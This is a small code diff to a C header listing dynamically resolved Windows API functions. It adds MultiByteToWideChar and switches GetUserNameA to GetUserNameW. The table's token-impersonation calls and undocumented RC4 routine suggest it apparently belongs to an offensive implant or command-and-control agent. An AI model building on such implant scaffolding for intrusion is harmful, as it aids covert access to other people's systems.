@@ -244,6 +244,7 @@ typedef struct
         WIN_FUNC( GetProcAddress )
         WIN_FUNC( CreatePipe )
         WIN_FUNC( ReadFile )
+        WIN_FUNC( MultiByteToWideChar )
         WIN_FUNC( GetComputerNameExA )
         WIN_FUNC( LocalAlloc )      /* TODO: replace with RtlAllocateHeap */
         WIN_FUNC( LocalFree )       /* TODO: replace with RtlFreeHeap */
@@ -306,7 +307,7 @@ typedef struct
 
         // Advapi32
         WIN_FUNC( GetTokenInformation )
-        WIN_FUNC( GetUserNameA )
+        WIN_FUNC( GetUserNameW )
         WIN_FUNC( CreateProcessWithTokenW )
         WIN_FUNC( CreateProcessWithLogonW )
         NTSTATUS ( WINAPI* SystemFunction032 ) ( struct ustring* data, struct ustring* key );
